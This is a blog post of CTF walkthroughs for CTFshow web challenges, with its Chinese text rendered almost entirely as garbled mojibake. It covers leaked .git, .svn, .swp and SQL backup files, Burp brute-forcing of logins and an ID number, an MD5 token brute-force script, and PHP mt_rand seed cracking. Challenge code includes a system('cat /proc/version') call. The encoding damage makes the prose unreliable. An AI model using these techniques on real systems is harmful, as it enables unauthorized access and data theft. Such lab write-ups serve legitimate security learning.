ç¦æ­¢ä¿å­˜ï¼š&lt;noscript&gt;&lt;iframe src=&quot;*.htm&quot;&gt;&lt;/iframe&gt;&lt;/noscript&gt;ï¼Œæ”¾åœ¨headé‡Œé¢ã€‚
ç¦æ­¢ç²˜è´´ï¼š&lt;input type=text onpaste=function()&#123;return false&#125;;&gt;
ç¦æ­¢å‰ªè´´ï¼šoncut = function()&#123;return false&#125;;ï¼›
å…³é—­è¾“å…¥æ³•ï¼š&lt;input style=&quot;ime-mode:disabled&quot;&gt;</code></pre>



<h3 id="web03"><a href="#web03" class="headerlink" title="web03"></a>web03</h3><p>æç¤ºæŠ“åŒ…ï¼Œé‚£å°±æŠ“</p>
<p>bpå‘åŒ…ç›´æ¥çœ‹åˆ°flagåœ¨headeré‡Œé¢</p>
<p>æˆ–è€…ä½ F12çœ‹ä¸€çœ¼<code>Network(ç½‘ç»œ)</code>åˆ·æ–°ä¸€ä¸‹ï¼Œç‚¹è¿›urlä¹Ÿå¯ä»¥ä»æ ‡å¤´è¿™é‡Œæ‰¾åˆ°</p>
<h3 id="web04"><a href="#web04" class="headerlink" title="web04"></a>web04</h3><p>æç¤ºrobots</p>
<p>é‚£å°±æ˜¯<code>robots.txt(çˆ¬è™«åè®®)</code>ï¼Œå‘Šè¯‰ä½ å“ªäº›å¯ä»¥çˆ¬ï¼Œå“ªäº›ä¸èƒ½çˆ¬æ¥çš„</p>
<p>çœŸå®åœºæ™¯è®°å¾—åˆ«æ‰‹è´±å°±å¥½äº†ã€‚ã€‚CTFå€’æ˜¯æ— æ‰€è°“</p>
<pre><code class="highlight plaintext">User-agent: *
Disallow: /flagishere.txt</code></pre>

<h3 id="web05"><a href="#web05" class="headerlink" title="web05"></a>web05</h3><p>æç¤º<code>phps</code>æºç æ³„éœ²</p>
<p>ä¼—æ‰€å‘¨çŸ¥</p>
<p><code>phps php~ php.bak</code>è¿™äº›éƒ½æ˜¯æºç æ³„éœ²ï¼Œæ‰«åˆ°å°±æ˜¯èµšåˆ°</p>
<h3 id="web06"><a href="#web06" class="headerlink" title="web06"></a>web06</h3><p>è§£å‹æºç åˆ°å½“å‰ç›®å½•æ˜¯æƒ³èµ¤ç´«è›‹äº†ï¼Œæ„Ÿè§‰æ˜¯<code>www.zip</code>æˆ–è€…<code>.git</code>ä¹‹ç±»çš„</p>
<p>æ‰«ä¸€ä¸‹ï¼Œæ˜¯<a href="http://www.zip/">www.zip</a></p>
<p>ä¸‹ä¸‹æ¥çœ‹åˆ°ç›®å½•é‡Œæœ‰<code>index.php</code>å’Œ<code>fl000g.txt</code></p>
<p>æ‰“å¼€ä¸€çœ¼<code>fakeflag</code>ï¼Œä½†æ˜¯è·¯å¾„åº”è¯¥æ²¡é”™</p>
<p>é—»ç€å‘³æ‘¸è¿‡å»æ‹¿åˆ°flag</p>
<h3 id="web07"><a href="#web07" class="headerlink" title="web07"></a>web07</h3><pre><code class="highlight plaintext">ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</code></pre>

<p>ä¸æ‡‚ï¼Œå…ˆåƒæˆ‘ä¸€æ‰«</p>
<p>æ‰«å‡ºæ¥<code>/.git/</code>ï¼Œç›´æ¥ç»™äº†</p>
<p>ç½‘ä¸Šæ‰¾äº†ç‚¹è§£é‡Š</p>
<pre><code class="highlight plaintext">git æ˜¯ä¸€ä¸ªç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œå¾ˆå¤šç¨‹åºçš„å¼€å‘éƒ½æ˜¯å¤šåç¨‹åºå‘˜ååŒå¼€å‘çš„ï¼Œè€Œ git åˆ™æ˜¯ä¸€ä¸ªä¸é”™çš„å¤šäººååŒå·¥å…·+ç‰ˆæœ¬æ§åˆ¶å·¥å…·ã€‚

ç”±äºéƒ¨ç½²é¡¹ç›®çš„æ–¹ä¾¿ï¼Œæœ‰å¾ˆå¤šè¿ç»´äººå‘˜ç›´æ¥åœ¨ç½‘ç«™æ ¹ç›®å½•ä½¿ç”¨ git clone é¡¹ç›®åœ°å€ï¼Œæ­¤æ—¶ç½‘ç«™æ ¹ç›®å½•å°±ä¼šå­˜åœ¨ .git ç›®å½•ï¼Œé€šè¿‡è¯¥ç›®å½•å°±å¯ä»¥å›æ»šåˆ°æŸä¸ªç‰ˆæœ¬æˆ–è€…ä¸‹è½½æœ€æ–°çš„é¡¹ç›®æºç ã€‚
githack:https://github.com/BugScanTeam/GitHack</code></pre>

<h3 id="web08"><a href="#web08" class="headerlink" title="web08"></a>web08</h3><p>hintæ˜¯ä¸€æ ·çš„ã€‚ã€‚</p>
<p>é‚£å†åƒæˆ‘ä¸€æ‰«,æ‰«åˆ°<code>/.svn/</code>ï¼Œä¹Ÿæ˜¯ç›´æ¥ç»™</p>
<h3 id="web09"><a href="#web09" class="headerlink" title="web09"></a>web09</h3><pre><code class="highlight plaintext">å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</code></pre>

<p>vimï¼Ÿé‚£æˆ‘å¯è¦é—»ç€å‘³è¿‡æ¥äº†</p>
<p>vimå¼ºåˆ¶å…³é—­æ—¶ä¼šäº§ç”Ÿä¸€ä¸ª<code>.swp</code>æ–‡ä»¶</p>
<pre><code class="highlight plaintext">belike: index.php -&gt; index.php.swp</code></pre>

<p>ä¸‹è¿‡æ¥å°±ç›´æ¥ç»™äº†</p>
<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><pre><code class="highlight plaintext">cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</code></pre>

<p>å¹¶éé¥¼å¹²ï¼Œå¯ä»¥æŠ“ä¸ªåŒ…çœ‹çœ‹</p>
<p>æŠ“åˆ°åŒ…ç›´æ¥Cookie: flagå°±å†™ä½ è„¸ä¸Šäº†</p>
<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><pre><code class="highlight plaintext">åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚flag.ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯</code></pre>

<p>é€šè¿‡dnsæ£€æŸ¥æŸ¥è¯¢flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT è®°å½•ï¼Œä¸€èˆ¬æŒ‡ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®çš„è¯´æ˜ã€‚</p>
<p>æŸ¥æ‰¾flag.ctfshow.comåŸŸåä¸‹çš„txtè®°å½•</p>
<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><pre><code class="highlight plaintext">æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </code></pre>

<pre><code class="highlight plaintext">Help Line Number : 372619038</code></pre>

<p>æ‰«å‡ºæ¥ä¸€ä¸ª<code>admin/index.php</code></p>
<p>ç™»å½•æˆåŠŸåŠ›ï¼Œç›´æ¥æ‹¿åˆ°flag</p>
<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><pre><code class="highlight plaintext">æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </code></pre>

<p>æ ¹æ®æç¤ºæ„Ÿè§‰åƒå¼±å¯†ç </p>
<p>ç»“æœæ˜¯æ³„éœ²ã€‚<code>/home</code>ä¸‹é¢æ¢ä¸€å †æ‰¾åˆ°é‚£ä¸ª<code>Document</code></p>
<p>ç‚¹è¿›å»å°±æ˜¯ä¸€ä¸ªä½¿ç”¨æŒ‡å—ï¼ŒæŒ‰æ‰€ç»™ä¿¡æ¯ç™»å½•å°±è¡Œ</p>
<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><pre><code class="highlight plaintext">æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº</code></pre>

<p>ä»”ç»†è§‚å¯Ÿæºç ï¼Œçœ‹åˆ°ä¸€ä¸ªè·¯å¾„<code>editor/upload/banner-app.png</code></p>
<p>uploadè¢«ç¦æ­¢è®¿é—®äº†ï¼Œåªèƒ½åˆ°<code>/editor</code>ç¿»ä¸€ä¸‹</p>
<p>ç¿»åˆ°ä¸€ä¸ªæ’å…¥æ–‡ä»¶ï¼Œæ²¡æƒ³åˆ°èƒ½ç›´æ¥è°ƒç”¨æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p>ç¿»ä¸€ä¸‹</p>
<p>ç›´æ¥æ‹¿åˆ°flag<code>è·¯å¾„:nothinghere/fl000g.txt</code></p>
<h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><pre><code class="highlight plaintext">å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</code></pre>

<p>çœ‹ä¸€çœ¼é‚®ç®±</p>
<pre><code class="highlight plaintext">1156631961@qq.com</code></pre>

<p>åˆæ‰«åˆ°<code>/admin/</code>äº†</p>
<p>è¯•ä¸€ä¸‹éƒ½ä¸å¯¹å•Šã€‚æ˜¯ä¸æ˜¯è¦å¿˜è®°å¯†ç </p>
<p>è¦å›ç­”åŸå¸‚ã€‚ã€‚åŸæ¥æ˜¯ç¤¾å·¥é¢˜ç›®å—å“ˆå“ˆã€‚ã€‚</p>
<p>QQæ‰¾ä¸€ä¸‹å°±å¥½äº†</p>
<h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><pre><code class="highlight plaintext">å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</code></pre>

<p>ç”¨<code>wappalyzer</code>çœ‹ä¸€çœ¼ï¼Œè¯­è¨€æ˜¯PHPï¼ŒPHPæ¢é’ˆæ²¡è·‘äº†ï¼Œæ¢é’ˆæ³„éœ²è·¯å¾„<code>tz.php</code></p>
<p>å‘ç°å¯ä»¥ç›´æ¥æŸ¥çœ‹<code>phpinfo()</code></p>
<p>ç›´æ¥æ‘¸åˆ°flag</p>
<h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><pre><code class="highlight plaintext">å¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</code></pre>

<p>ä¸çŸ¥é“æŒ‡çš„æ˜¯<code>.bak</code>çš„åç¼€è¿˜æ˜¯ä»€ä¹ˆ</p>
<p>æ‰«åˆ°ä¸€ä¸ª<code>backup.sql</code></p>
<p>æ‰“å¼€flagç›´æ¥å°±åœ¨é‡Œé¢</p>
<h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><pre><code class="highlight plaintext">ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</code></pre>

<p>çœ‹æ¥æ˜¯webå‰ç«¯é¢˜äº†</p>
<p>å½“ç„¶å…ˆçœ‹ä¸€çœ¼æœ‰æ²¡æœ‰æºç ç›´æ¥ç»™</p>
<p>æ‘¸åˆ°ä¸€ä¸ªunicodeç¼–ç </p>
<pre><code class="highlight plaintext">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code></pre>

<p>è½¬æ¢è¿‡æ¥å°±æ˜¯:ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹</p>
<p><code>110.php</code></p>
<p>ç›´æ¥ç»™äº†flag</p>
<h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><pre><code class="highlight plaintext">å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</code></pre>

<p>çœ‹èµ·æ¥åƒä¸€ä¸ªå¯†é’¥æ³„éœ²å—¯ã€‚ã€‚æ˜¯flaskçš„SECRET_KEYå—ï¼Ÿè¿˜æ˜¯ä»€ä¹ˆã€‚çœ‹ä¸€çœ¼å…ˆ</p>
<p>å¥½å§é«˜ä¼°äº†ï¼Œå°±æ˜¯ä¸€ä¸ªåˆ¤æ–­é€»è¾‘æ”¾åœ¨äº†å‰ç«¯å¹¶ä¸”å¯†ç å’Œç”¨æˆ·éƒ½æ˜¯æ˜æ–‡</p>
<p>ä½†æ˜¯æ˜¾ç¤ºå¯†ç é”™è¯¯ï¼ŒçŒœæµ‹æ˜¯æ”¾çš„å¯†ç æ˜¯è¢«åŠ å¯†è¿‡çš„</p>
<p>é‚£ä¹ˆå°è¯•æŠ“åŒ…æ”¹å¯†ç çœ‹çœ‹è¿™ä¸ªåŠ å¯†æ˜¯åœ¨å‰ç«¯è¿˜æ˜¯åœ¨åç«¯çš„</p>
<p>ç»“æœæ˜¯å‰ç«¯ï¼Œç›´æ¥å¾—åˆ°flag</p>
<h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><pre><code class="highlight plaintext">mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</code></pre>

<p>é€šè¿‡äº†è§£å¦‚æœæ•°æ®åº“æœªè®¾ç½®è®¿é—®æƒé™çš„è¯ï¼Œæ˜¯å¯ä»¥ç›´æ¥è®¿é—® æŠŠæ•°æ®åº“ç»™ä¸‹è½½ä¸‹æ¥çš„</p>
<p>å°è¯•é€šè¿‡é»˜è®¤åç§°<code>database.mdb</code>è®¿é—®æ— æœï¼Œä½†æ˜¯æ‰«åˆ°äº†<code>/db</code></p>
<p>ä½†æ˜¯è®¿é—®ä¸äº†ï¼Œç”¨ä¸€ä¸‹é€’å½’æ‰«æï¼Œæ‘¸åˆ°äº†<code>db.mdb</code></p>
<p>ä¸‹è½½åˆ°æœ¬åœ°ç”¨010æœä¸€ä¸‹å…³é”®å­—å°±å¯ä»¥</p>
<h2 id="çˆ†ç ´-Complete"><a href="#çˆ†ç ´-Complete" class="headerlink" title="çˆ†ç ´(Complete)"></a>çˆ†ç ´(Complete)</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><pre><code class="highlight plaintext">çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“</code></pre>

<p>ä¸Šæ¥å°±å¼¹æ˜¯å§?ä¸Šbp</p>
<p>è¿™é‡Œäº†è§£ä¸€ä¸‹bpçš„<strong>Custom iterator</strong>æ¨¡å¼</p>
<p>å¯ä»¥å°†palyloadåˆ†å—å¤„ç†</p>
<p>æ¯”å¦‚è¿™é¢˜çš„è´¦å·å¯†ç å…¶å®æ˜¯ä»¥è¿™ç§æ–¹å¼å­˜åœ¨çš„</p>
<pre><code class="highlight plaintext">base64encode(username:passwd)</code></pre>

<p>å¹¶ä¸”æ³¨å…¥ä½ç½®åœ¨<code>Authorization</code></p>
<p>è®°å¾—æŠŠæœ€åçš„<code>urlencode</code>ç»™å»æ‰</p>
<h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;
    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);
    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;
        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;
            <span class="keyword">echo</span> <span class="variable">$flag</span>;
        &#125;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

&#125;
<span class="meta">?&gt;</span></code></pre>

<p>å…·ä½“è¦æ±‚æ˜¯è¿™æ ·:</p>
<pre><code class="highlight plaintext">ç¬¬2ä½è¦å’Œç¬¬15ä½ç›¸ç­‰ï¼Œç¬¬15ä½è¦å’Œç¬¬18ä½ç›¸ç­‰
å¹¶ä¸”ç¬¬2ä½+ç¬¬15ä½+ç¬¬18ä½/ç¬¬2ä½è¦ç­‰äºç¬¬32ä½</code></pre>

<pre><code class="highlight php"><span class="comment">#encoding=gbk</span>
import hashlib

def <span class="title function_ invoke__">check</span>(md5str):
    <span class="comment"># æå–å¯¹åº”ä½ç½®çš„å­—ç¬¦</span>
    c1 = md5str[<span class="number">1</span>]
    c2 = md5str[<span class="number">14</span>]
    c3 = md5str[<span class="number">17</span>]
    c4 = md5str[<span class="number">31</span>]

    <span class="comment"># æ¡ä»¶1ï¼šä¸‰ä¸ªå­—ç¬¦ç›¸ç­‰</span>
    <span class="keyword">if</span> c1 != c2 <span class="keyword">or</span> c2 != c3:
        <span class="keyword">return</span> False

    <span class="comment"># æ¡ä»¶2ï¼šè®¡ç®—è¡¨è¾¾å¼ï¼ˆè½¬ int å‰éœ€ç¡®ä¿æ˜¯æ•°å­—ï¼‰</span>
    <span class="keyword">if</span> <span class="title function_ invoke__">not</span> (c1.<span class="title function_ invoke__">isdigit</span>() <span class="keyword">and</span> c4.<span class="title function_ invoke__">isdigit</span>()):
        <span class="keyword">return</span> False

    c = <span class="keyword">int</span>(c1)
    <span class="keyword">try</span>:
        result = (c + c + c) / c
    except ZeroDivisionError:
        <span class="keyword">return</span> False

    <span class="keyword">return</span> <span class="keyword">int</span>(result) == <span class="keyword">int</span>(c4)

<span class="comment"># æš´åŠ›æšä¸¾ token å€¼</span>
<span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">100000000</span>):
    token = <span class="title function_ invoke__">str</span>(i)
    md5val = hashlib.<span class="title function_ invoke__">md5</span>(token.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()
    <span class="keyword">if</span> <span class="title function_ invoke__">check</span>(md5val):
        <span class="keyword">print</span>(f<span class="string">&quot;[+] æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„ tokenï¼š&#123;token&#125;&quot;</span>)
        <span class="keyword">print</span>(f<span class="string">&quot;    md5: &#123;md5val&#125;&quot;</span>)
        <span class="keyword">break</span>
</code></pre>

<h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;
    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];
    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);
    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);
&#125;</code></pre>

<p>ä¸€ä¸ªä¼ªéšæœºæ•°çš„é—®é¢˜ã€‚ç§å­å›ºå®šï¼Œéšæœºå€¼æ˜¯å›ºå®šçš„é‚£å‡ ä¸ª</p>
<p>è‡ªå·±æ‹¿phpè·‘ä¸€ä¸‹è¿™ä¸ªç§å­çš„éšæœºå€¼ä¼ å‚å³å¯</p>
<h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>


<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;
    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];
    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));
    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());
    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;
            <span class="keyword">echo</span> <span class="variable">$flag</span>;
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="variable">$rand</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);
&#125;
</code></pre>

<p>æˆ‘ä»¬æ¥ç†ä¸€ä¸‹ </p>
<pre><code class="highlight plaintext">1.å°†flag:MD5ç¼–ç --&gt;å–[0:7]--&gt;ä½œä¸ºhexè½¬æ¢æˆåè¿›åˆ¶--&gt;ä½œä¸ºç§å­
2.æ¯”è¾ƒtokenå’Œ2*mt_rand()</code></pre>

<p>è¿˜æ˜¯å¥½è§£å†³çš„ï¼Œå› ä¸ºè¿”å›äº†<code>$rand</code>å€¼ï¼Œå¯ä»¥é€†ç€æ¨å‡º<code>$mt_rand</code></p>
<p>è¿™é‡Œæ˜¯894610327</p>
<p>ä½¿ç”¨<code>php_mt_rand</code>å·¥å…·æ¥ç ´è§£ä¸€ä¸‹ï¼Œå¹¶ç»“åˆå½“å‰PHPç‰ˆæœ¬å¾—åˆ°äº†åˆé€‚çš„ç§å­</p>
<pre><code class="highlight plaintext">1324767434 
2626545208 
3845172103</code></pre>

<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709152756959.png" alt="image-20250709152756959"></p>
<p>è¿æ°”ä¸æ˜¯å¾ˆå¥½å•Šã€‚ã€‚é‚£åªèƒ½ä¸€ä¸ªä¸ªè¯•è¿‡å»äº†</p>
<p>ç»“æœéƒ½æ²¡æ‰“å‡ºæ¥ï¼Œä½•æ„å‘¢ã€‚ã€‚é‡æ–°å¼€äº†é¶æœºå†è¯•ï¼Œ104429216</p>
<pre><code class="highlight plaintext">131270818
2698696663 
3895390800</code></pre>

<p>ã€‚ï¼Ÿè¿˜æ˜¯å‡ºä¸æ¥ï¼Œä»”ç»†å†çœ‹ä¸€çœ¼</p>
<p>æé”™äº†ææˆ1+2äº†åŸæ¥æ˜¯2+3å•Šå“ˆå“ˆã€‚ã€‚</p>
<p>æœ€åè¯•å‡ºæ¥æ˜¯ç¬¬ä¸‰ä¸ª</p>
<h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p>å®‰è£…ç•Œé¢ç›´æ¥è¿æ¥å°±è¯´è¿ä¸Šäº†ã€‚ã€‚å¥½æ€ªå•Šã€‚</p>
<p>æ‰¾æ‰¾æºç ï¼Œæ‰¾åˆ°ä¸€ä¸ª<code>checkdb.php</code></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709160523122.png" alt="image-20250709160523122"></p>
<pre><code class="highlight plaintext">POSTï¼ša=&amp;p=&amp;u=&amp;d=&amp;pass=</code></pre>

<p>ä½†æ˜¯å…¶å®æŠ“åŒ…æŠ“ä¸€ä¸‹å¯ä»¥ç›´æ¥çœ‹åˆ°flagçš„ã€‚<img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709161018103.png" alt="image-20250709161018103"></p>
<h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>æœ¬æ¥ä»¥ä¸ºæ˜¯çˆ†ç ´adminçš„å¯†ç çˆ†äº†åŠå¤©æ²¡æ”¶è·ç»“æœå‘ç°æ˜¯è®©æˆ‘çˆ†ç ´äººèº«ä»½è¯å·ç ã€‚</p>
<pre><code class="highlight plaintext">é«˜å…ˆä¼Š
621022********5237</code></pre>

<p>è¿™è¾¹çˆ†ç ´ä¸€ä¸‹æ—¥æœŸ</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709162357752.png" alt="image-20250709162357752"></p>
<p>çˆ†ç ´äº†åŠå¤©å¾—åˆ°621022199002015237</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709165512904.png" alt="image-20250709165512904"></p>
<p>ç™»å½•å°±å¯ä»¥æ‹¿åˆ°flag</p>
<h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>æŒºé‚ªé—¨çš„é¢˜ç›®ï¼Œéšä¾¿æ”¹URLçš„è¯ä¼šæ˜¾ç¤ºé‡å®šå‘è¿‡å¤š</p>
<p>å°è¯•æŠŠæœ€åçš„å»æ‰ï¼Œå¯¹0å’Œ1çš„ä½ç½®è¿›è¡Œ1-100éå†(é—®å°±æ˜¯æ‰«å‡ºæ¥æ˜¯1-100)</p>
<p>è¿™é‡Œä½¿ç”¨<code>Cluster bomb</code>æ¨¡å¼</p>
<p><code>payload type</code>ä¸º<code>Numbers</code></p>
<p>å¯¹1å’Œ2ä½ç½®éƒ½è®¾ç½®1-100</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709172439403.png" alt="image-20250709172439403"></p>
<h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><p>å¥½ç©çˆ±ç©ï¼Œå¥½åƒçˆ±åƒ</p>
<p>å–œæ¬¢æˆ‘RCEå—</p>
